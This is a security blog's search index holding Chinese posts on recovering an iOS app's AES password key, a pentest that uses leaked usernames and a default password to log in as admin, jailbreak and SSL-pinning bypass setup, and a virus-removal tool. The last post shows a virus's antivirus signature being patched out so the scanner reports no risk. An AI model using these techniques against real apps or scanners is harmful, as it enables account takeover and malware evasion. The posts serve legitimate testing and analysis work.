<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ios_reverse_reactnative_case</title>
      <link href="/2023/11/23/ios-reverse-reactnative-case/"/>
      <url>/2023/11/23/ios-reverse-reactnative-case/</url>
      
        <content type="html"><![CDATA[<p><a name="womOQ"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一个用<code>React Native</code>构建的IOS应用案例，需要获取密码的加密算法。</p><a id="more"></a><p><a name="jOsMy"></a></p><h2 id="0x01-过程"><a href="#0x01-过程" class="headerlink" title="0x01 过程"></a>0x01 过程</h2><p>登录抓包，发现密码被加密<br><img src="image01.png" alt="01.png"><br>然后对APP进行砸壳<br><img src="image02.png" alt="02.png"></p><p>发现了文件<code>main.jsbundle</code>，这个通常是由 <code>React Native</code>框架生成的。<code>React Native</code>是一个流行的跨平台移动应用开发框架，它允许开发者使用<code>JavaScript</code> 和 <code>React</code> 来构建应用。<br>使用 <code>React Native</code> 打包的应用，应用的一部分或全部界面和逻辑是用 <code>JavaScript</code> 实现的，而<code>JavaScript</code> 代码和资源会被打包成 <code>main.jsbundle</code> 文件。所以我们可以分析<code>main.jsbundle</code> 文件，将其重命名为<code>js</code>后缀，然后打开并格式化。</p><p>这里要寻找密码的加密方式，所以搜索<code>password:</code>，经过筛选后定位到下图代码<br><img src="image03.png" alt="03.png"><br>主要代码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> e = c.state, t = e.username, n = e.password, l = e.deviceId, o = (<span class="number">0</span>, r(d[<span class="number">21</span>]).uuid)(<span class="number">16</span>),</span><br><span class="line">s = r(d[<span class="number">22</span>]).SecurityTools.AES_createKey(), u = &#123;</span><br><span class="line">  username: t,</span><br><span class="line">  password: (<span class="number">0</span>, r(d[<span class="number">23</span>]).btoa)(o) + <span class="string">"."</span> + (<span class="number">0</span>, r(d[<span class="number">24</span>]).encrypt)(n, o),</span><br><span class="line">  rememberMe: !<span class="number">1</span>,</span><br><span class="line">  language: <span class="string">'zhCN'</span>,</span><br><span class="line">  requestFrom: <span class="string">'app'</span>,</span><br><span class="line">  _KEY_: s,</span><br><span class="line">  ClientFlag: <span class="string">'PWdCipher'</span>,</span><br><span class="line">  deviceId: l</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>password的话由两部分组成，然后用”.”拼接了起来。<br>js中<code>(0,函数名)(参数)</code>就相当于函数的调用，如<br><img src="image04.png" alt="04.png"></p><p>所以password这里可以看作为</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r(d[<span class="number">23</span>]).btoa(o) + <span class="string">"."</span> +  r(d[<span class="number">24</span>]).encrypt(n, o)</span><br></pre></td></tr></table></figure><p><code>o</code>是由<code>(0, r(d[21]).uuid)(16)</code>获取的，<code>uuid</code> 通常是一个用于生成唯一标识符（UUID）的函数。在这里可能是用来生成一个特定长度为16位的UUID。<br><code>btoa</code> 是一个内置的 JavaScript 函数，通常用于Base64 编码。在这里，<code>r(d[23]).btoa</code>可能是对 btoa 函数的引用。因此判断前半部分的话应该是对<code>o</code>进行了base64编码。<br>根据抓包的结果，password前半部分为<code>V2FQRTlMbU5PejBwc0VsSw==</code>，对其进行base64解码，结果为<code>WaPE9LmNOz0psElK</code>，刚好是16位长度。这里的<code>o</code>对应的内容为<code>WaPE9LmNOz0psElK</code> 。<br>后半部分采用了<code>encrypt</code>加密，有2个参数n和o，n为输入的密码（测试的时候输入的是1），当前情况下<code>o</code>为<code>WaPE9LmNOz0psElK</code> 。<br>我们搜索<code>encrypt = function \(\w+, \w+\)</code><br>只有一个结果<br><img src="image05.png" alt="05.png"><br>采用了AES-CBC加密，参数<code>f</code>为输入的密码，c为16位的随机数（当前情况下c为<code>WaPE9LmNOz0psElK</code>）<br>接下来就是确定<code>n.default.secretKey</code>的值了。这个应用比较简单，直接查找使用就能找到值。<br><img src="image06.png" alt="06.png"><br>成功解密。<br><img src="image07.png" alt="07.png"></p><p>这是比较顺利的情况，可以直接找到<code>secretKey</code>。如果无法直接找到的话，可以通过插桩的方法来输出<code>secretKey</code>的值。将修改后的文件与<code>main.jsbundle</code>替换，然后重新打包ipa文件，也可以通过直接ssh连接到手机，直接替换<code>main.jsbundle</code>。第一种方法比较麻烦一点，一般都采用第二种。<br>ssh连接手机，执行命令<code>find / -name &quot;main.jsbundle&quot;</code>来搜索<code>main.jsbundle</code>文件。<br><img src="image08.png" alt="08.png"><br>红框中打码的内容为xxxx_app，与ipa解压payload中的一样，所以是这个。<br>然后通过<code>scp</code>将本地修改好的文件上传到手机上，替换<code>main.jsbundle</code>，重新运行app即可。<br>插桩的方法也有多种，如可以使用<code>console.log</code>或者<code>alert</code>输出。<br><img src="image09.png" alt="09.png"><br>运行效果<br><img src="image10.png" alt="10.png"></p><p>也可以设置一个全局变量（tempSecretKey），然后将<code>secretKey</code>的值赋给全局变量，然后放在数据包请求中。</p><p><img src="image11.png" alt="11.png"><br><img src="image12.png" alt="12.png"><br>运行APP后，进行抓包<br><img src="image13.png" alt="13.png"><br>也是可以成功获取secretKey的。<br><a name="wPZRP"></a></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>对于<code>React Native</code>打包的APP，主要是分析<code>main.jsbundle</code>文件。通过插桩的方式来辅助分析，修改后替换手机上的文件。另外使用 <code>HBuilder</code> 开发的项目，做法类似，主要是分析和替换<code>app-service.js</code>文件 。</p>]]></content>
      
      
      <categories>
          
          <category> IOS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOS逆向 </tag>
            
            <tag> React Native </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【渗透案例】消失的登录页面</title>
      <link href="/2023/11/08/vanished-login-page/"/>
      <url>/2023/11/08/vanished-login-page/</url>
      
        <content type="html"><![CDATA[<p><a name="75dc90f7"></a></p><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>在某次测试过程中，遇到了这样一个网站，存在登录页面但却无法直接通过地址栏访问login页面。在 JS 文件中发现了默认密码，同时找到了登录接口，然而密码进行了加密。通过分析JS文件，最终通过两种方式来实现了登录，一种是找到密码的加密方法，一种是让登录接口”重见天日”。</p><p><a name="b40fd1a3"></a></p><a id="more"></a><h2 id="0x01过程"><a href="#0x01过程" class="headerlink" title="0x01过程"></a>0x01过程</h2><p>网站主页都是一些展示的内容，js文件是通过webpack打包的，格式化后大概三十多万行。<br>通过js文件发现了一些接口，其中有些接口存在未授权访问漏洞。而且有一个接口可以查看上传的所有附件信息，其中还包含了用户名。<br><img src="1699372058582-5c199822-230d-4376-b6ee-8f31cbd92640-736620.jpg" alt></p><p>通过分析JS文件，发现存在默认密码</p><p><img src="1699372058821-56144eb0-ed31-4887-afe0-bb30f8ca6a41-706259.jpg" alt><br><img src="1699372058927-ffdc647f-e9e1-493a-bb2c-db0b08db1717-747883.jpg" alt></p><p>而且也找到了登录的接口，一共两个，一个是Login，一个是LoginApp，其中LoginApp不需要验证码。<br><img src="1699372059040-6849ea96-3935-4c00-b426-974803c5e7b5-293000.jpg" alt></p><p>目前有登录的接口、一部分用户名（从未授权中获取的），还有系统的默认密码，接下来就是测试那些用户使用了默认密码，可以成功登录。但是从登录接口发现，登录过程中密码采用了<code>_encrypt</code>函数进行加密。<br>大概如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t.prototype._encrypt = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> D(y.Md5.hashStr(t.toString()).toString())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以猜测首先对密码进行了Md5加密后，又经过了<code>D</code>函数进行加密。接下来可以寻找<code>D</code>函数是如何进行加密的。<br>一般情况下，<code>D</code>函数有如下两种定义的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">D</span>(<span class="params">params</span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">D = <span class="function"><span class="keyword">function</span>(<span class="params">params</span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以通过下面的两种正则进行搜索。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D &#x3D; function\(\w\)</span><br><span class="line">function D\(\w\)</span><br></pre></td></tr></table></figure><p><img src="1699372059145-537841dc-9236-461f-b79f-73a765cd6531-940044.jpg" alt></p><p><img src="1699372059298-02462190-a2f9-476a-b556-05055ba5c855-577260.jpg" alt><br>幸好<code>D</code>函数不多，也没有混淆，经过确认<code>D</code>函数是<code>SHA1</code>加密。<br>而且经过验证，成功找到了几个可以登录的账号。<br><img src="1699372059419-48301f97-2efd-4f5f-84ab-18253f7e8fcf-662464.jpg" alt></p><p>登录后，某个接口可以列举所有的用户，包括该用户加密后的密码。<br><img src="1699372059591-f6d4307a-ebe1-4680-8c2b-3a84881072d5-845594.jpg" alt></p><p>例如登录admin用户。<br><img src="1699372059758-22b4260b-0100-44f9-a538-ae3f6600c364-719612.jpg" alt></p><p>回过头来继续看登录页面，直接浏览器访问<a href="https://test.com/login" target="_blank" rel="noopener">https://test.com/login</a> 时，会重定向到主页。<br><img src="1699372059897-c867ac68-5b91-402f-a981-fa43fb50e575-598074.jpg" alt></p><p>通过搜索js文件<br><img src="1699372060047-1ca18d20-91ed-4303-bb10-31126e8ed577-296321.jpg" alt></p><p>发现了<code>n.router.navigateByUrl(&quot;/login&quot;)</code>，这是一个用于在前端Web应用中进行路由导航的代码片段。它通常在前端框架或库（如Angular、Vue.js、React等）中使用，用于导航到指定的路由或页面。</p><p>当执行它时，应用程序会导航到 <code>/login</code> 路由或页面。<br><img src="1699372060186-b5c0c500-62e6-4946-8d57-e3f0f216bbf2-623137.jpg" alt></p><p>因此我们导航加载的位置，然后执行<code>router.navigateByUrl(&quot;/login&quot;)</code>，这里是<code>this.navigateByUrl(&quot;/login&quot;)</code><br>成功的跳转到了登录的页面</p><p><img src="1699372060310-e3aae466-1c65-4f55-bf18-5a8d12515579-413915.jpg" alt></p><p>通过验证，Login接口密码也是经过了md5后再进行SHA1加密。<br><img src="1699372060424-10c96cfb-a79a-4b7c-bf92-3bd47a4e01a1-410887.jpg" alt></p><p><a name="231f1858"></a></p><h2 id="0x02总结"><a href="#0x02总结" class="headerlink" title="0x02总结"></a>0x02总结</h2><p>这个网站虽然存在登录页面，但无法直接通过URL访问。通过分析JS代码发现了默认密码，了解了密码加密方式。通过API接口，找到了未授权访问漏洞，获取了用户名，实现了登录。另外通过分析js，可以使用<code>router.navigateByUrl(&quot;/login&quot;)</code>来导航到登录页面，从而让登录页面出现，然后通过登录页面来登录。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
            <tag> 路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【IOS逆向】越狱环境搭建</title>
      <link href="/2023/03/07/IOS-Jailbreak-Environment/"/>
      <url>/2023/03/07/IOS-Jailbreak-Environment/</url>
      
        <content type="html"><![CDATA[<p><a name="WDT9z"></a></p><h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>由于之前用的手机是IPhone6s，版本是12.4，有一些APP打开会直接闪退，于是换了一部6sp，版本是14.6。对其进行越狱，安装一些所需要的插件，并记录一下过程。</p><a id="more"></a><p><a name="lXyGU"></a></p><h1 id="0x01-使用checkra1n越狱"><a href="#0x01-使用checkra1n越狱" class="headerlink" title="0x01 使用checkra1n越狱"></a>0x01 使用checkra1n越狱</h1><p>一般常用的是unc0ver或者checkra1n进行越狱，前者的稍微简单一点，后者稍微复杂一些。<br>这里本打算直接使用<a href="http://unc0ver.dev/" target="_blank" rel="noopener">unc0ver</a>进行越狱，结果安装后提示不支持。<br><img src="1678114608980-20a62fb2-fe56-4e36-b403-03a3ee01fa98-555750.png" alt="image.png"></p><p>于是这里使用checkra1n进行越狱。</p><p><img src="1675066606534-d67fb1cf-32d2-404d-b60b-4a84e010fb8a-321016.png" alt="image.png"><br>打开checkra1n虽然提示不支持14.6，这里<code>Start</code>按钮是灰色的。<br>选择<code>Options</code><br><img src="1675066632706-2f561ee7-721b-4222-a3d0-af5070781546-546389.png" alt="image.png"><br>勾选前两项。然后点击<code>Back</code>返回。此时<code>Start</code>按钮就可以使用了。</p><p><img src="1675066654217-4d2384e2-1426-40c7-9609-c3273dd337c2-642089.png" alt="image.png"></p><p>手机进入恢复模式<br><img src="1675066673619-44317ee5-5324-45db-b2d8-58a27e05f797-952033.png" alt="image.png"><br>根据提示进行越狱</p><p><img src="1675066687340-36a4e331-c845-4eaa-aaaa-0fe213194399-370019.png" alt="image.png"></p><p>点<code>Start</code>按钮</p><p>然后一起按着关机键和Home键<br><img src="1675066770867-bfdd74cd-4b50-47ea-8a4d-4637201923a6-001976.png" alt="image.png"><br>倒计时结束松开关机键，仍然按着Home键。然后等待即可</p><p><img src="1675067032189-e124d611-70b1-477e-9190-6d70c3f5f4ea-611456.png" alt="image.png"></p><p>等手机重启后就进入了越狱模式。<br><img src="1675067412165-548b8b6b-a210-45a8-a303-1c2a1d42fc27-062660.png" alt="image.png"></p><blockquote><p>非完美越狱，重启后仍需重新越狱。</p></blockquote><p>使用checkra1n越狱后，需要手动安装cydia，之后才可以进行插件的安装。<br><a name="suTIf"></a></p><h1 id="0x02-插件安装"><a href="#0x02-插件安装" class="headerlink" title="0x02 插件安装"></a>0x02 插件安装</h1><p><a name="Paa6a"></a></p><h3 id="安装cydia"><a href="#安装cydia" class="headerlink" title="安装cydia"></a>安装cydia</h3><p>Cydia是一款用于iOS设备（如iPhone和iPad）的第三方应用商店，允许用户下载、安装和管理未经授权的应用程序、扩展和主题。<br>在checkra1n中安装cydia<br><img src="1678115413051-9439aeaf-8fe1-4bb1-a254-fbfccfb97d68-045700.png" alt="image.png"></p><blockquote><p>网络问题可以挂上科学。</p></blockquote><p><a name="CIgaU"></a></p><h3 id="安装ssh"><a href="#安装ssh" class="headerlink" title="安装ssh"></a>安装ssh</h3><p>打开Cydia应用商店，搜索<code>openssh</code>，然后安装即可。<br><img src="1678116166466-fd615fb9-6570-4f96-883b-a8824e3a4cbb-586646.png" alt="image.png"></p><p>安装后可以使用ssh进行访问，默认密码<code>alpine</code></p><p> <img src="1678116733150-6bd4bf4d-96d5-4003-b0cd-658ab54c2e69-471031.png" alt="image.png"></p><blockquote><p>可以使用<code>iproxy 2222 22</code>将手机的22端口转发到2222端口。</p></blockquote><p><a name="zHI4J"></a></p><h3 id="安装FlyJB-X-屏蔽越狱检测插件"><a href="#安装FlyJB-X-屏蔽越狱检测插件" class="headerlink" title="安装FlyJB X 屏蔽越狱检测插件"></a>安装FlyJB X 屏蔽越狱检测插件</h3><p>添加雷锋软件源<a href="http://apt.abcydia.com" target="_blank" rel="noopener">http://apt.abcydia.com</a>，搜索FlyJB<br><img src="1678117026770-2834618a-a472-4538-bad2-7bfd3f976d57-831327.png" alt="image.png"></p><p><img src="1678117128035-d1b5504e-12d4-43bd-8e8b-aef2dff6cc05-797322.png" alt="image.png"><br><img src="1678117174840-87f16dd2-91af-43db-9d8c-a7e60b6d8655-851893.png" alt="image.png"><br><a name="IlJop"></a></p><h3 id="安装frida"><a href="#安装frida" class="headerlink" title="安装frida"></a>安装frida</h3><p>添加源<a href="https://build.frida.re/" target="_blank" rel="noopener">https://build.frida.re/</a>,然后搜索frida<br>安装其它版本的frida可以从github下载所需的frida安装包，然后通过命令安装。例如安装15.1.17版本的Frida。<br>下载deb文件<br><a href="https://github.com/frida/frida/releases?page=3" target="_blank" rel="noopener">https://github.com/frida/frida/releases?page=3</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp -P2225 frida_15<span class="number">.1</span><span class="number">.17</span>_iphoneos-arm.deb root@localhost:/tmp</span><br><span class="line">dpkg -i frida_15<span class="number">.1</span><span class="number">.17</span>_iphoneos-arm.deb</span><br><span class="line">killall -HUP SpringBoard</span><br></pre></td></tr></table></figure><p><img src="1678117329741-7bc9eb5f-8bff-4d0f-b9ac-5630c0beaa5e-860795.png" alt="image.png"></p><p><img src="1678117782210-eee504dd-8993-4e35-a8f1-d3ae94c52fd0-927625.png" alt="image.png"><br><a name="Fj9Lg"></a></p><h3 id="安装SSLKillSwitch"><a href="#安装SSLKillSwitch" class="headerlink" title="安装SSLKillSwitch"></a>安装SSLKillSwitch</h3><p>SSLKillSwitch是ios中常用解除SSL pining的插件。<br><a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="noopener">https://github.com/nabla-c0d3/ssl-kill-switch2</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/nabla-c0d3/ssl-kill-switch2/releases/download/<span class="number">0.14</span>/com.nablac0d3.sslkillswitch2_0<span class="number">.14</span>.deb</span><br><span class="line">scp -P <span class="number">2224</span> com.nablac0d3.sslkillswitch2_0<span class="number">.14</span>.deb root@localhost:/tmp</span><br><span class="line">dpkg -i com.nablac0d3.sslkillswitch2_0<span class="number">.14</span>.deb</span><br><span class="line">killall -HUP SpringBoard</span><br></pre></td></tr></table></figure><p>安装时需要确保Cydia已经安装了下列软件：<br>Debian Packager<br>Cydia Substrate<br>PreferenceLoader</p><blockquote><p>也可以直接添加源<a href="https://julioverne.github.io/" target="_blank" rel="noopener">https://julioverne.github.io/</a>，从上面安装（我使用这个APP直接闪退）</p></blockquote><p><img src="1678117594455-d6d4a316-a037-45b7-87a3-3bdac5682716-231139.png" alt="image.png"><br><img src="1678239711620-614be9e9-cf37-4c88-b316-b65883605d83-933121.png" alt="image.png"></p><blockquote><p>如果在设置中看不到SSL Kill Switch2，可以尝试重新安装PreferenceLoader、Cydia Substrate</p></blockquote><p><a name="rnnB4"></a></p><h3 id="巨魔商店"><a href="#巨魔商店" class="headerlink" title="巨魔商店"></a>巨魔商店</h3><p>巨魔商店（TrollStore） 是一个永久可以安装未签名IPA应用程序，适用于iiOS 14.0 - 15.5b4, 15.6b1 - 15.6b5。<br>添加源<a href="https://havoc.app/" target="_blank" rel="noopener">https://havoc.app/</a>，搜索安装TrollStore Helper，然后安装TrollStore。<br><img src="1678118932247-f2d3cda3-9ff1-46e4-b982-9718a102b0c0-214427.png" alt="image.png"><br>更多请参考：<a href="https://github.com/opa334/TrollStore/blob/main/install_trollhelper.md" target="_blank" rel="noopener">https://github.com/opa334/TrollStore/blob/main/install_trollhelper.md</a><br><a name="pownE"></a></p><h3 id="其它插件"><a href="#其它插件" class="headerlink" title="其它插件"></a>其它插件</h3><p>可以安装Filza、Terminal等，前者是文件管理，后者是手机上的终端工具。<br>Filza<br><img src="1678119168245-412596b3-8dc9-416a-9dbe-747c068da5f0-827670.png" alt="image.png"></p><p>Terminal<br><img src="1678119249839-19fd3b24-96bf-4dd0-9610-09fbaa043399-572951.png" alt="image.png"></p><p><a name="CMEKi"></a></p><h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul><li>在越狱过程中，一定要注意选择适合您设备的越狱工具和操作系统版本。如果选择错误，可能会导致设备无法使用或出现其他问题。</li><li>越狱可能会使您的设备更加脆弱和不稳定，因此请谨慎考虑是否需要越狱。一些越狱应用和插件可能会导致设备出现问题或无法启动，甚至可能会损坏设备。</li><li>在越狱后，一定要注意安装和使用可信的越狱应用和插件，以避免安全问题和系统崩溃等问题。一些未经官方认证的应用和插件可能包含恶意代码或病毒，会对设备造成损害。</li></ul>]]></content>
      
      
      <categories>
          
          <category> IOS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOS越狱 </tag>
            
            <tag> checkra1n越狱 </tag>
            
            <tag> 越狱插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何从零写一个病毒专杀工具</title>
      <link href="/2022/10/28/Ground-Virus-Kill/"/>
      <url>/2022/10/28/Ground-Virus-Kill/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近有这样一个需求，需要对某病毒写一个专杀工具，针对这款病毒进行查杀。这个病毒样本是今年2月份发现的，该病毒相对来说比较友好，没有采用加密，也没有删除原文件，也没有网络传播行为。只是会感染可执行文件，会将原文件修改名字，生成一个与原文件同名的感染文件，运行后可继续感染其他文件。接下来首先从非专业的角度来简单看一下该病毒是如何运行的。</p><a id="more"></a><h2 id="0x01-病毒分析"><a href="#0x01-病毒分析" class="headerlink" title="0x01 病毒分析"></a>0x01 病毒分析</h2><p>运行病毒文件，一旦找到可感染的可执行文件，病毒会将其复制为 <code>g&lt;原始文件名&gt;.exe</code>，并将其隐藏。然后用原程序的名称和图标复制自己；如果原文件的资源中不存在该图标，病毒将使用自己的图标，并留下一个0大小的文件<code>g&lt;原始文件名&gt;.ico</code>。生成的文件大小为522k左右。</p><p><img src="1666836383554.png" alt="img"></p><p>如上图，python.exe感染后会生成gpython.exe（原始程序）并隐藏，此时python.exe（感染程序）相当于一个加载器，运行时会执行病毒程序同时运行gpython.exe。</p><p>如果文件夹中文件exe文件是g开头，则不感染。</p><p><img src="1666837129684.png" alt="img"></p><p>当点击替换后的可执行文件后，病毒会启动恶意主程序ground.exe，感染其他可执行文件，并设置开机启动项。</p><p><img src="1666836811133.png" alt="img"></p><p>启动项</p><p><img src="1666836847856.png" alt="img"></p><p>通过非专业的角度对病毒文件的运行进行了简单的分析，病毒查杀的话就是全盘或指定路径扫描可执行文件，根据病毒文件的特征码来判断该文件是否是病毒文件，如果是则进行删除，然后将原文件进行恢复。大致流程如下图：</p><p><img src="1666791988659.png" alt="img"></p><h2 id="0x02-代码编写"><a href="#0x02-代码编写" class="headerlink" title="0x02 代码编写"></a>0x02 代码编写</h2><p>根据上面的流程图，查杀代码可以分为三部分：1.实现可执行文件的扫描功能；2.实现病毒特征识别功能；3.删除病毒，恢复原文件。语言采用了C++，面向必（C）应（V）编程。</p><h3 id="1-文件扫描实现"><a href="#1-文件扫描实现" class="headerlink" title="1.文件扫描实现"></a>1.文件扫描实现</h3><p>其实就是递归遍历目录下的所有可执行文件，这里实现的方式有多种。例如可以采用<code>filesystem</code>（C++17以上）、<code>io.h</code>、<code>winApi</code>等。这里采用的是winApi。</p><p>主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;  result;</span><br><span class="line"><span class="function"><span class="keyword">bool</span>  <span class="title">search</span><span class="params">(<span class="keyword">const</span>  <span class="keyword">char</span>* path = <span class="string">"C:\\"</span>, <span class="keyword">char</span>* file = <span class="string">"exe"</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        HANDLE hFile;</span><br><span class="line">        <span class="keyword">char</span>   <span class="built_in">buffer</span>[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">        WIN32_FIND_DATA pNextInfo;  <span class="comment">//搜索得到的文件信息将储存在pNextInfo中;</span></span><br><span class="line">        sprintf_s(<span class="built_in">buffer</span>, <span class="string">"%s\\*.*"</span>, path);</span><br><span class="line">        hFile = FindFirstFile(<span class="built_in">buffer</span>, &amp;pNextInfo);<span class="comment">//请注意是 &amp;pNextInfo , 不是 pNextInfo;</span></span><br><span class="line">        <span class="keyword">if</span> (!hFile) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span>  t;</span><br><span class="line">        <span class="comment">//cout &lt;&lt; buffer &lt;&lt; endl;</span></span><br><span class="line">        <span class="keyword">while</span> (FindNextFile(hFile, &amp;pNextInfo))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pNextInfo.cFileName[<span class="number">0</span>] == <span class="string">'.'</span>)<span class="comment">//过滤.和..</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; pNextInfo.cFileName &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">if</span> (pNextInfo.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">            &#123;</span><br><span class="line">                ZeroMemory(<span class="built_in">buffer</span>, MAX_PATH);</span><br><span class="line">                sprintf_s(<span class="built_in">buffer</span>, <span class="string">"%s\\%s"</span>, path, pNextInfo.cFileName);</span><br><span class="line">                <span class="comment">//cout &lt;&lt; buffer &lt;&lt; endl;</span></span><br><span class="line">                search(<span class="built_in">buffer</span>, file);</span><br><span class="line">            &#125;</span><br><span class="line">            t.assign(path);</span><br><span class="line">            t += <span class="string">'\\'</span>;</span><br><span class="line">            t.append(pNextInfo.cFileName);</span><br><span class="line">            <span class="keyword">int</span> len = <span class="built_in">strlen</span>(file);</span><br><span class="line">            <span class="keyword">if</span> (t.substr(t.<span class="built_in">size</span>() - len) == file)</span><br><span class="line">            &#123;</span><br><span class="line">                result.push_back(t);<span class="comment">//对t对象进行深复制</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    search(<span class="string">"E:\\"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, result.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是递归搜索所有exe后缀的文件，然后存在vector中。</p><h3 id="2-病毒特征码提取"><a href="#2-病毒特征码提取" class="headerlink" title="2.病毒特征码提取"></a>2.病毒特征码提取</h3><p>特征码可能是病毒的感染标记，也可能是若干计算机指令组成的一段计算机程序。特征码的提取方式有多种，例如该病毒中存在字符串<code>Groud</code>，可以以此作为特征码。</p><p><img src="1666856505117.png" alt="img"></p><p>搜索字符串<code>Ground</code>，有多处存在，挑选一处。如上图所示，如果位置<code>0x59B53</code>-<code>0x59B59</code>为<code>47 72 6F 75 6E 64</code>则认为该文件为病毒文件。这是根据字符串特征来搜索的，可能会不太准确，也可以采用病毒查杀的方式来定位特征码。可以使用工具MYCCL3.0或者VirTest5.0。这里使用的是VirTest5.0。</p><p>根据工具的使用说明来制作测试文件和载入测试文件。</p><p><img src="1666857098976.png" alt="img"></p><p>接下来就是定位特征了，这里杀软使用了某绒。</p><p><img src="1666857445236.png" alt="img"></p><p>最终定位到了偏移0x290-0x294，内容为<code>046AF6EB</code>。我们来验证一下。将偏移0x290-0x294的数据nop后，针对该文件以及该文件感染的文件，用该huorong杀毒扫描，提示无风险。</p><p><img src="1666861432606.png" alt="img"></p><p>而且执行感染的文件，杀软也不会对其进行拦截。</p><p><img src="1666861732742.png" 